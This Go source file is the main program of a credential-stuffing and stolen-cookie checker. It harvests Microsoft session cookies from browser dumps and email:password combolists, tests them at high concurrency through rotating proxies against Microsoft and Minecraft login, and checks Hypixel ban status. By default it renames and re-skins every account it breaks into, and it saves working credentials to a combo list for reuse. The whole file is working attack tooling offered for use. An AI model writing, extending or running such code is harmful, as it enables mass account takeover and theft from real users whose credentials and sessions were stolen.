package main

import (
	"context"
	"errors"
	"flag"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"cookie_checker/auth"
	"cookie_checker/internal/combo"
	"cookie_checker/internal/cookiefile"
	"cookie_checker/internal/extract"
	"cookie_checker/internal/hypixel"
	"cookie_checker/internal/namechange"
	"cookie_checker/internal/proxyutil"
)

type job struct {
	kind     string // cookie | cred
	path     string // cookie file path
	email    string
	password string
	label    string // display / results label
}

var (
	hitsDir        string
	hitsBannedDir  string
	hitsOKDir      string
	hitsNeverDir   string
	hitsHypErrDir  string
	invalidDir     string
	noMCDir        string
	cookiesDir     = "cookies"
	resultsRoot    = "results"
	resultsDir     string
	resultsFile    string
	errorsFile     string
	doHypixel      = true
	relocateMode   = "copy" // copy | move | none
	doRename       = true   // rename + re-skin every hit account
	skinFilePath   string   // path to local PNG skin file; empty = skip skin upload
	skinVariant    = "classic"

	errLogMu   sync.Mutex
	errLog     *os.File
	lastErrMsg atomic.Value // string
)

const (
	colorReset  = "\033[0m"
	colorGreen  = "\033[32m"
	colorYellow = "\033[33m"
	colorRed    = "\033[31m"
	colorMag    = "\033[35m"
	colorCyan   = "\033[36m"
)

func main() {
	if len(os.Args) > 1 && os.Args[1] == "extract" {
		os.Exit(runExtract(os.Args[2:]))
	}

	workers := flag.Int("w", 250, "concurrent checks (default 250 for high CPM)")
	noSort := flag.Bool("no-sort", false, "do not copy/move files into results folders")
	doMove := flag.Bool("move", false, "move files into results instead of copying (deletes from cookies/)")
	timeout := flag.Duration("timeout", 25*time.Second, "per-request HTTP client timeout")
	dir := flag.String("dir", cookiesDir, "directory containing cookie files")
	comboPath := flag.String("combo", "", "extra combolist file/dir (in addition to auto-scan of -dir)")
	ulpPath := flag.String("ulp", "", "extra ULP/passwords file/dir (in addition to auto-scan of -dir)")
	ulpAll := flag.Bool("ulp-all", false, "keep all ULP hosts (default: Microsoft-related only)")
	noCookies := flag.Bool("no-cookies", false, "skip cookie file checks")
	noCreds := flag.Bool("no-creds", false, "skip auto combolist/ULP/passwords discovery in -dir")
	proxyFile := flag.String("proxies", "proxies.txt", "proxy list file (required when Hypixel check is on)")
	noHypixel   := flag.Bool("no-hypixel", false, "skip automatic Hypixel ban check on hits")
	runName     := flag.String("run", "", "results subfolder name (default: timestamp)")
	allFiles    := flag.Bool("all", false, "check all cookie-like files (skip MSPAuth session prefilter scan)")
	noRename    := flag.Bool("no-rename", false, "skip automatic name and skin change on hits")
	skinFile    := flag.String("skin-file", "", "path to local PNG skin file applied on every hit (empty = no skin change)")
	skinVarFlag := flag.String("skin-variant", "classic", "skin model variant: classic or slim")
	flag.Parse()

	if *workers < 1 {
		*workers = 1
	}
	cookiesDir = *dir
	doHypixel = !*noHypixel
	if *noSort {
		relocateMode = "none"
	} else if *doMove {
		relocateMode = "move"
	} else {
		relocateMode = "copy"
	}
	doRename = !*noRename
	skinFilePath = strings.TrimSpace(*skinFile)
	skinVariant = strings.TrimSpace(*skinVarFlag)
	if skinVariant == "" {
		skinVariant = "classic"
	}

	name := strings.TrimSpace(*runName)
	if name == "" {
		name = time.Now().Format("2006-01-02_15-04-05")
	}
	name = sanitizeRunName(name)
	resultsDir = filepath.Join(resultsRoot, name)
	hitsDir = filepath.Join(resultsDir, "hits")
	hitsBannedDir = filepath.Join(hitsDir, "banned")
	hitsOKDir = filepath.Join(hitsDir, "unbanned")
	hitsNeverDir = filepath.Join(hitsDir, "never_joined")
	hitsHypErrDir = filepath.Join(hitsDir, "hypixel_error")
	invalidDir = filepath.Join(resultsDir, "invalid")
	noMCDir = filepath.Join(resultsDir, "no_minecraft")
	resultsFile = filepath.Join(resultsDir, "results.txt")
	errorsFile = filepath.Join(resultsDir, "errors.txt")
	ensureDirs()
	initErrorLog()
	defer closeErrorLog()

	useCombo := strings.TrimSpace(*comboPath) != ""
	useULP := strings.TrimSpace(*ulpPath) != ""
	dirOK := false
	if st, err := os.Stat(cookiesDir); err == nil && st.IsDir() {
		dirOK = true
	}
	useCookies := !*noCookies && dirOK
	useDirCreds := !*noCreds && dirOK
	if !dirOK && !useCombo && !useULP {
		fmt.Fprintf(os.Stderr, "cookie dir not found: %s\n", cookiesDir)
		os.Exit(1)
	}

	fmt.Printf("run %s | workers=%d", resultsDir, *workers)
	if doHypixel {
		fmt.Print(" | hypixel=on")
	}
	if doRename {
		fmt.Print(" | rename=on")
		if skinFilePath != "" {
			fmt.Print(" | skin=on")
		}
	}
	if *allFiles {
		fmt.Print(" | all-files=on")
	}
	if useCookies {
		fmt.Print(" | cookies=on")
	}
	if useDirCreds {
		fmt.Print(" | dir-creds=on")
	}
	if useCombo {
		fmt.Print(" | combo=on")
	}
	if useULP {
		fmt.Print(" | ulp=on")
	}
	fmt.Println()

	var pool *proxyutil.Pool
	if _, err := os.Stat(*proxyFile); err == nil {
		loaded, err := proxyutil.LoadFile(*proxyFile)
		if err != nil {
			fmt.Fprintf(os.Stderr, "proxy load failed: %v\n", err)
			os.Exit(1)
		}
		pool = loaded
		fmt.Printf("proxies %d\n", pool.Len())
	} else if doHypixel {
		fmt.Fprintf(os.Stderr, "proxies required for Hypixel check but %s not found\n", *proxyFile)
		os.Exit(1)
	}

	var work []job
	var credParts [][]combo.Cred
	credOpt := combo.LoadOptions{MSOnly: !*ulpAll}

	if useCookies {
		files, err := cookiefile.DiscoverWith(cookiesDir, cookiefile.DiscoverOptions{AllFiles: *allFiles})
		if err != nil {
			fmt.Fprintf(os.Stderr, "scan failed: %v\n", err)
			os.Exit(1)
		}
		fmt.Printf("cookies %d files\n", len(files))
		for _, f := range files {
			work = append(work, job{kind: "cookie", path: f})
		}
	}
	// Auto-pull combolists / ULP / passwords.txt from the same -dir tree.
	// (This walks the tree again — can take a bit on huge dumps; shows its own progress.)
	if useDirCreds {
		creds, err := combo.DiscoverInDir(cookiesDir, credOpt)
		if err != nil {
			fmt.Fprintf(os.Stderr, "creds scan failed: %v\n", err)
			os.Exit(1)
		}
		if len(creds) > 0 {
			fmt.Printf("dir creds %d accounts\n", len(creds))
			credParts = append(credParts, creds)
		}
	}
	if useCombo {
		creds, err := combo.LoadAnyPath(*comboPath, combo.LoadOptions{})
		if err != nil {
			fmt.Fprintf(os.Stderr, "combo load failed: %v\n", err)
			os.Exit(1)
		}
		fmt.Printf("combo %d accounts\n", len(creds))
		credParts = append(credParts, creds)
	}
	if useULP {
		creds, err := combo.LoadAnyPath(*ulpPath, credOpt)
		if err != nil {
			fmt.Fprintf(os.Stderr, "ulp load failed: %v\n", err)
			os.Exit(1)
		}
		fmt.Printf("ulp %d accounts\n", len(creds))
		credParts = append(credParts, creds)
	}
	merged := combo.Merge(credParts...)
	if len(merged) > 0 {
		fmt.Printf("credential jobs %d (deduped)\n", len(merged))
	}
	for _, c := range merged {
		work = append(work, job{kind: "cred", email: c.Email, password: c.Password, label: c.Source})
	}
	if len(work) == 0 {
		fmt.Printf("No accounts/files to check\n")
		os.Exit(1)
	}

	clients := auth.NewClientPool(*timeout, *workers)

	fmt.Printf("checking %d...\n", len(work))

	start := time.Now()
	var (
		done      atomic.Int64
		hitsN     atomic.Int64
		bannedN   atomic.Int64
		blockedN  atomic.Int64
		unbannedN atomic.Int64
		neverN    atomic.Int64
		hypErrN   atomic.Int64
		noMCN     atomic.Int64
		deadN     atomic.Int64
		errN      atomic.Int64
		mu        sync.Mutex
		all       = make([]auth.Result, 0, len(work))
		printMu   sync.Mutex
		comboHitMu sync.Mutex
	)

	jobs := make(chan job, *workers*2)
	var wg sync.WaitGroup
	for i := 0; i < *workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for j := range jobs {
				var proxyURL *url.URL
				if pool != nil {
					proxyURL = pool.Next()
				}
				checker := &auth.Checker{Client: clients.Client(proxyURL)}
				var res auth.Result
				switch j.kind {
				case "cred":
					res = processCred(checker, j.email, j.password, j.label, proxyURL, &comboHitMu)
				default:
					res = processOne(checker, j.path, proxyURL)
				}
				switch res.Status {
				case auth.StatusHit:
					hitsN.Add(1)
					switch res.HypixelStatus {
					case string(hypixel.StatusBanned):
						if isSecurityBlock(res.HypixelReason) {
							blockedN.Add(1)
						} else {
							bannedN.Add(1)
						}
					case string(hypixel.StatusUnbanned):
						unbannedN.Add(1)
					case string(hypixel.StatusNeverJoined):
						neverN.Add(1)
					case string(hypixel.StatusError):
						hypErrN.Add(1)
					}
				case auth.StatusNoMinecraft:
					noMCN.Add(1)
				case auth.StatusInvalid:
					deadN.Add(1)
				default:
					errN.Add(1)
				}
				n := done.Add(1)
				printMu.Lock()
				printResult(res, n, int64(len(work)), start, &hitsN, &deadN, &noMCN, &errN)
				printMu.Unlock()
				mu.Lock()
				all = append(all, res)
				mu.Unlock()
			}
		}()
	}

	for _, j := range work {
		jobs <- j
	}
	close(jobs)
	wg.Wait()

	elapsed := time.Since(start)
	writeResults(all)
	cpm := float64(len(work)) / (elapsed.Seconds() / 60.0)

	fmt.Printf(
		"\nDone in %s — %s%d hit(s)%s / %d checked (%.0f CPM).\n",
		elapsed.Round(time.Millisecond),
		colorGreen, hitsN.Load(), colorReset,
		len(work),
		cpm,
	)
	if doHypixel {
		fmt.Printf("  hypixel: banned=%d  blocked=%d  unbanned=%d  never=%d  error=%d\n",
			bannedN.Load(), blockedN.Load(), unbannedN.Load(), neverN.Load(), hypErrN.Load())
	}
	fmt.Printf("  hits=%d  no_mc=%d  invalid=%d  errors=%d\n",
		hitsN.Load(), noMCN.Load(), deadN.Load(), errN.Load())
	if errN.Load() > 0 {
		if s, _ := lastErrMsg.Load().(string); s != "" {
			fmt.Printf("  last error: %s\n", s)
		}
		fmt.Printf("  errors log -> %s\n", errorsFile)
	}
	fmt.Printf("  results -> %s\n", resultsDir)
}

func runExtract(args []string) int {
	fs := flag.NewFlagSet("extract", flag.ExitOnError)
	out := fs.String("o", "cookies", "output folder for numbered MS cookie files")
	allMS := fs.Bool("all-ms", false, "keep files with any MS-domain cookies (default: session cookies required)")
	fs.Usage = func() {
		fmt.Fprintf(os.Stderr, "Usage: %s extract [flags] <dump-directory>\n\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "Crawl every .txt under the dump directory and write Microsoft cookies as 1.txt, 2.txt, ...\n\n")
		fs.PrintDefaults()
	}
	_ = fs.Parse(args)
	if fs.NArg() < 1 {
		fs.Usage()
		return 2
	}

	root := fs.Arg(0)
	info, err := os.Stat(root)
	if err != nil || !info.IsDir() {
		fmt.Fprintf(os.Stderr, "Not a directory: %s\n", root)
		return 1
	}

	st, err := extract.Run(extract.Options{
		Root:           root,
		OutDir:         *out,
		RequireSession: !*allMS,
	})
	if err != nil {
		fmt.Fprintf(os.Stderr, "extract failed: %v\n", err)
		return 1
	}
	fmt.Printf("done: wrote %d -> %s (scanned %d)\n", st.Written, *out, st.Scanned)
	return 0
}

func sanitizeRunName(name string) string {
	replacer := strings.NewReplacer(
		`<`, "_", `>`, "_", `:`, "-", `"`, "_", `/`, "_", `\`, "_", `|`, "_", `?`, "_", `*`, "_",
	)
	name = strings.TrimSpace(replacer.Replace(name))
	if name == "" || name == "." || name == ".." {
		return time.Now().Format("2006-01-02_15-04-05")
	}
	return name
}

func processOne(checker *auth.Checker, path string, proxyURL *url.URL) auth.Result {
	rel := path
	if r, err := filepath.Rel(cookiesDir, path); err == nil {
		rel = r
	}

	cs, err := cookiefile.ParseFile(path)
	if err != nil {
		res := auth.Result{Status: auth.StatusError, File: rel, Reason: "Parse error: " + err.Error()}
		relocate(path, invalidDir)
		return res
	}
	// Full browser dumps include thousands of unrelated cookies — MSA auth only
	// wants live/microsoft/xbox cookies (same as extract). Sending everything → HTTP 400.
	cs = cookiefile.FilterMS(cs)
	if len(cs) == 0 {
		res := auth.Result{
			Status: auth.StatusInvalid,
			File:   rel,
			Reason: "No Microsoft-domain cookies",
		}
		relocate(path, invalidDir)
		return res
	}
	// Prefer real session cookies, but still attempt files that only have
	// login.live.com / microsoftonline cookies (looser dump exports).
	if !cookiefile.HasSessionCookies(cs) && !cookiefile.HasLoginDomainCookies(cs) {
		res := auth.Result{
			Status: auth.StatusInvalid,
			File:   rel,
			Reason: "No Microsoft login cookies (MSPAuth/MSPProf or login.live.com)",
		}
		relocate(path, invalidDir)
		return res
	}

	header := cookiefile.ToHeader(cs)
	if header == "" {
		res := auth.Result{
			Status: auth.StatusInvalid,
			File:   rel,
			Reason: "MS cookies present but Cookie header empty after sanitize",
		}
		relocate(path, invalidDir)
		return res
	}
	email := cookiefile.GuessEmail(header)
	ctx := context.Background()
	res := checker.Check(ctx, header, rel, email)
	return finishHit(res, path, proxyURL, false, nil, checker.Client)
}

func processCred(checker *auth.Checker, email, password, label string, proxyURL *url.URL, comboHitMu *sync.Mutex) auth.Result {
	ctx := context.Background()
	res := checker.CheckPassword(ctx, email, password, label)
	return finishHit(res, "", proxyURL, true, comboHitMu, checker.Client)
}

// applyNameAndSkin renames the hit account to a generated g00n_XXXX name and
// uploads the configured skin PNG. Both operations are attempted independently;
// failures are recorded in res.NameChangeErr / res.SkinChangeErr.
func applyNameAndSkin(ctx context.Context, client *http.Client, res *auth.Result) {
	newName := namechange.GenerateName()
	if err := namechange.ChangeName(ctx, client, res.AccessToken, newName); err != nil {
		switch {
		case errors.Is(err, namechange.ErrNotEligible):
			// Account is on Mojang's 30-day rename cooldown or otherwise restricted.
			res.NameChangeErr = "not changeable"
		case errors.Is(err, namechange.ErrNameUnavailable):
			// The randomly-generated name happened to be taken; not a real blocker.
			res.NameChangeErr = "name taken (try again)"
		default:
			res.NameChangeErr = err.Error()
		}
	} else {
		res.NewUsername = newName
		res.NameChanged = true
	}
	if skinFilePath != "" {
		if err := namechange.ChangeSkinFromFile(ctx, client, res.AccessToken, skinFilePath, skinVariant); err != nil {
			res.SkinChangeErr = err.Error()
		} else {
			res.SkinChanged = true
		}
	}
}

func finishHit(res auth.Result, cookiePath string, proxyURL *url.URL, isCred bool, comboHitMu *sync.Mutex, client *http.Client) auth.Result {
	ctx := context.Background()

	// Rename + re-skin the account BEFORE the Hypixel join so the server sees
	// the new username in the Login Start packet (required for a valid session).
	if res.Status == auth.StatusHit && doRename && res.AccessToken != "" {
		applyNameAndSkin(ctx, client, &res)
	}

	if res.Status == auth.StatusHit && doHypixel {
		// After a successful rename the Login Start name must match the new IGN.
		joinName := res.Username
		if res.NewUsername != "" {
			joinName = res.NewUsername
		}
		if res.AccessToken == "" || joinName == "" {
			res.HypixelStatus = string(hypixel.StatusError)
			res.HypixelReason = "HIT without MC token/username (cannot join Hypixel)"
		} else {
			hr := hypixel.Check(ctx, res.AccessToken, joinName, res.UUID, proxyURL)
			res.HypixelStatus = string(hr.Status)
			res.HypixelReason = hr.Reason
			res.HypixelBanDuration = hr.BanDuration
		}
		status := "error"
		destDir := hitsHypErrDir
		switch hypixel.Status(res.HypixelStatus) {
		case hypixel.StatusBanned:
			destDir = hitsBannedDir
			if isSecurityBlock(res.HypixelReason) {
				status = "blocked"
			} else {
				status = "banned"
			}
		case hypixel.StatusUnbanned:
			destDir = hitsOKDir
			status = "unbanned"
		case hypixel.StatusNeverJoined:
			destDir = hitsNeverDir
			status = "never"
		}
		if isCred {
			writeCredHit(res, destDir, status, comboHitMu)
		} else {
			relocateAs(cookiePath, destDir, hitFilename(res.Username, status))
		}
		return res
	}

	if res.Status == auth.StatusHit {
		res.HypixelStatus = "skipped"
		if isCred {
			writeCredHit(res, hitsDir, "hit", comboHitMu)
		} else {
			relocateAs(cookiePath, hitsDir, hitFilename(res.Username, "hit"))
		}
		return res
	}

	if isCred {
		return res
	}
	switch res.Status {
	case auth.StatusNoMinecraft:
		relocate(cookiePath, noMCDir)
	default:
		relocate(cookiePath, invalidDir)
	}
	return res
}

func writeCredHit(res auth.Result, destDir, status string, mu *sync.Mutex) {
	if relocateMode == "none" {
		return
	}
	line := res.Email + ":" + res.Password
	if res.Email == "" || res.Password == "" {
		return
	}
	_ = os.MkdirAll(destDir, 0o755)
	base := hitFilename(res.Username, status)
	if res.Username == "" {
		base = hitFilename(sanitizeFilename(res.Email), status)
	}
	dest := uniquePath(destDir, base)
	_ = os.WriteFile(dest, []byte(line+"\n"), 0o644)

	// Append to a flat combo hits list for easy import.
	if mu != nil {
		mu.Lock()
		defer mu.Unlock()
	}
	f, err := os.OpenFile(filepath.Join(resultsDir, "hits_combo.txt"), os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o644)
	if err != nil {
		return
	}
	_, _ = f.WriteString(line + "\n")
	_ = f.Close()
}

func printResult(r auth.Result, n, total int64, start time.Time, hitsN, deadN, noMCN, errN *atomic.Int64) {
	switch r.Status {
	case auth.StatusHit:
		ign := safePrint(r.Username)
		if ign == "" || ign == "?" {
			ign = "?"
		}
		if em := safePrint(r.Email); em != "" && em != "?" {
			ign = ign + " | " + em
		}
		// Show rename / skin outcome inline with the IGN.
		if r.NameChanged {
			switch {
			case r.SkinChanged:
				ign += " -> " + r.NewUsername + " [name+skin changed]"
			case r.SkinChangeErr != "":
				ign += " -> " + r.NewUsername + " [name changed, skin ERR: " + truncateErr(r.SkinChangeErr, 35) + "]"
			default:
				ign += " -> " + r.NewUsername + " [name changed]"
			}
		} else if r.NameChangeErr != "" {
			switch r.NameChangeErr {
			case "not changeable":
				// Account is on Mojang's 30-day rename cooldown.
				ign += " [not changeable]"
			case "name taken (try again)":
				// The random g00n_ name collided; not the account's fault.
				ign += " [name taken — retry]"
			default:
				ign += " [rename ERR: " + truncateErr(r.NameChangeErr, 40) + "]"
			}
		}
		label, color := "HIT", colorGreen
		switch hypixel.Status(r.HypixelStatus) {
		case hypixel.StatusBanned:
			if isSecurityBlock(r.HypixelReason) {
				label, color = "BLOCKED", colorRed
			} else {
				color = colorRed
				if r.HypixelBanDuration != "" {
					label = "BANNED | " + r.HypixelBanDuration
				} else {
					label = "BANNED"
				}
			}
		case hypixel.StatusUnbanned:
			label, color = "UNBANNED", colorGreen
		case hypixel.StatusNeverJoined:
			label, color = "NEVER", colorYellow
		case hypixel.StatusError:
			label, color = "HIT", colorCyan
		}
		fmt.Printf("[%s%s%s] %s\n", color, label, colorReset, ign)
	case auth.StatusNoMinecraft:
		reason := safePrint(r.Reason)
		if reason == "" || reason == "?" {
			reason = "no minecraft"
		}
		fmt.Printf("[%sNO MC%s] %s | %s\n", colorYellow, colorReset, resultWho(r), reason)
	case auth.StatusInvalid:
		// Don't dump binary junk / every dead combo to the terminal.
		reason := safePrint(r.Reason)
		if reason == "" || reason == "?" {
			reason = "invalid"
		}
		who := resultWho(r)
		appendErrorLog(who, reason)
		// Only print clean, short invalids (skip garbage / password-fail spam).
		if r.Email == "" || (len(who) < 80 && !strings.Contains(reason, "password login failed")) {
			fmt.Printf("[%sINVALID%s] %s | %s\n", colorRed, colorReset, who, reason)
		}
	default:
		// StatusError — log to errors.txt only (not the terminal).
		reason := safePrint(r.Reason)
		if reason == "" || reason == "?" {
			reason = string(r.Status)
			if reason == "" {
				reason = "unknown error"
			}
		}
		who := resultWho(r)
		lastErrMsg.Store(reason)
		appendErrorLog(who, reason)
	}

	const every = 250
	if n%every == 0 || n == total {
		elapsed := time.Since(start).Seconds()
		cpm := float64(n) / (elapsed / 60.0)
		fmt.Printf("… %d/%d ~%.0f cpm | hits=%d invalid=%d no_mc=%d err=%d\n",
			n, total, cpm, hitsN.Load(), deadN.Load(), noMCN.Load(), errN.Load())
	}
}

func resultWho(r auth.Result) string {
	if em := safePrint(r.Email); em != "" && em != "?" {
		return em
	}
	if f := safePrint(r.File); f != "" && f != "?" {
		return f
	}
	return "?"
}

// safePrint strips non-ASCII/control bytes so binary mis-parses can't trash the terminal.
func safePrint(s string) string {
	if s == "" {
		return "?"
	}
	var b strings.Builder
	b.Grow(len(s))
	for _, r := range s {
		switch {
		case r >= 32 && r < 127:
			b.WriteRune(r)
		case r == '\t':
			b.WriteByte(' ')
		}
	}
	out := strings.TrimSpace(b.String())
	if out == "" {
		return "?"
	}
	if len(out) > 100 {
		return out[:97] + "..."
	}
	return out
}

func truncateErr(s string, n int) string {
	s = safePrint(s)
	if len(s) <= n {
		return s
	}
	return s[:n-3] + "..."
}

func initErrorLog() {
	f, err := os.OpenFile(errorsFile, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0o644)
	if err != nil {
		return
	}
	errLog = f
	_, _ = f.WriteString("# errors log\n")
}

func closeErrorLog() {
	errLogMu.Lock()
	defer errLogMu.Unlock()
	if errLog != nil {
		_ = errLog.Close()
		errLog = nil
	}
}

func appendErrorLog(who, reason string) {
	errLogMu.Lock()
	defer errLogMu.Unlock()
	if errLog == nil {
		return
	}
	_, _ = fmt.Fprintf(errLog, "%s\t%s\n", who, reason)
}

func isSecurityBlock(reason string) bool {
	lower := strings.ToLower(reason)
	return strings.Contains(lower, "security-block") ||
		strings.Contains(lower, "has been blocked") ||
		strings.Contains(lower, "account has been blocked")
}

func ensureDirs() {
	dirs := []string{cookiesDir, resultsDir, hitsDir, invalidDir, noMCDir}
	if doHypixel {
		dirs = append(dirs, hitsBannedDir, hitsOKDir, hitsNeverDir, hitsHypErrDir)
	}
	for _, d := range dirs {
		_ = os.MkdirAll(d, 0o755)
	}
}

func hitFilename(ign, status string) string {
	ign = sanitizeFilename(ign)
	if ign == "" {
		ign = "unknown"
	}
	status = sanitizeFilename(status)
	if status == "" {
		status = "hit"
	}
	return ign + "_" + status + ".txt"
}

func sanitizeFilename(s string) string {
	s = strings.TrimSpace(s)
	if s == "" {
		return ""
	}
	var b strings.Builder
	for _, r := range s {
		switch {
		case r >= 'a' && r <= 'z', r >= 'A' && r <= 'Z', r >= '0' && r <= '9', r == '_', r == '-':
			b.WriteRune(r)
		default:
			b.WriteByte('_')
		}
	}
	out := b.String()
	for strings.Contains(out, "__") {
		out = strings.ReplaceAll(out, "__", "_")
	}
	return strings.Trim(out, "_")
}

func relocate(src, destDir string) {
	relocateAs(src, destDir, filepath.Base(src))
}

func relocateAs(src, destDir, base string) {
	if relocateMode == "none" {
		return
	}
	if _, err := os.Stat(src); err != nil {
		return
	}
	if base == "" {
		base = filepath.Base(src)
	}
	_ = os.MkdirAll(destDir, 0o755)
	dest := uniquePath(destDir, base)
	if relocateMode == "move" {
		_ = os.Rename(src, dest)
		return
	}
	_ = copyFile(src, dest)
}

func uniquePath(destDir, base string) string {
	dest := filepath.Join(destDir, base)
	if _, err := os.Stat(dest); err != nil {
		return dest
	}
	ext := filepath.Ext(base)
	stem := strings.TrimSuffix(base, ext)
	for i := 1; ; i++ {
		cand := filepath.Join(destDir, fmt.Sprintf("%s_%d%s", stem, i, ext))
		if _, err := os.Stat(cand); os.IsNotExist(err) {
			return cand
		}
	}
}

func copyFile(src, dest string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()
	out, err := os.Create(dest)
	if err != nil {
		return err
	}
	defer out.Close()
	if _, err := io.Copy(out, in); err != nil {
		return err
	}
	return out.Close()
}

func writeResults(results []auth.Result) {
	var b strings.Builder
	var hits, noMC, dead, errs []auth.Result
	var banned, unbanned, never, hypErr []auth.Result
	for _, r := range results {
		switch r.Status {
		case auth.StatusHit:
			hits = append(hits, r)
			switch hypixel.Status(r.HypixelStatus) {
			case hypixel.StatusBanned:
				banned = append(banned, r)
			case hypixel.StatusUnbanned:
				unbanned = append(unbanned, r)
			case hypixel.StatusNeverJoined:
				never = append(never, r)
			case hypixel.StatusError:
				hypErr = append(hypErr, r)
			}
		case auth.StatusNoMinecraft:
			noMC = append(noMC, r)
		case auth.StatusInvalid:
			dead = append(dead, r)
		default:
			errs = append(errs, r)
		}
	}
	fmt.Fprintf(&b, "Run: %s\n", resultsDir)
	fmt.Fprintf(&b, "Checked %d files\n", len(results))
	fmt.Fprintf(&b, "Hits: %d | No Minecraft: %d | Invalid: %d | Errors: %d\n",
		len(hits), len(noMC), len(dead), len(errs))
	if doHypixel {
		fmt.Fprintf(&b, "Hypixel: banned=%d unbanned=%d never_joined=%d error=%d\n",
			len(banned), len(unbanned), len(never), len(hypErr))
	}
	b.WriteByte('\n')

	writeSection := func(title string, list []auth.Result, withProducts bool) {
		if len(list) == 0 {
			return
		}
		b.WriteString(title + "\n")
		for _, r := range list {
			cred := ""
			if r.Email != "" && r.Password != "" {
				cred = r.Email + ":" + r.Password + "\t"
			}
			if withProducts {
				fmt.Fprintf(&b, "%s%s\t%s\tproducts=%s\thypixel=%s\t%s\n",
					cred, r.File, r.Summary(), strings.Join(r.Products, ","), r.HypixelStatus, r.HypixelReason)
			} else {
				fmt.Fprintf(&b, "%s%s\t%s\n", cred, r.File, r.Reason)
			}
		}
		b.WriteByte('\n')
	}

	if doHypixel {
		writeSection("=== HYPIXEL BANNED ===", banned, true)
		writeSection("=== HYPIXEL UNBANNED ===", unbanned, true)
		writeSection("=== HYPIXEL NEVER JOINED ===", never, true)
		writeSection("=== HYPIXEL CHECK ERROR ===", hypErr, true)
	} else {
		writeSection("=== HITS ===", hits, true)
	}
	writeSection("=== VALID MSA, NO MINECRAFT ===", noMC, false)
	writeSection("=== INVALID / EXPIRED ===", dead, false)
	writeSection("=== ERRORS ===", errs, false)

	_ = os.WriteFile(resultsFile, []byte(b.String()), 0o644)
}
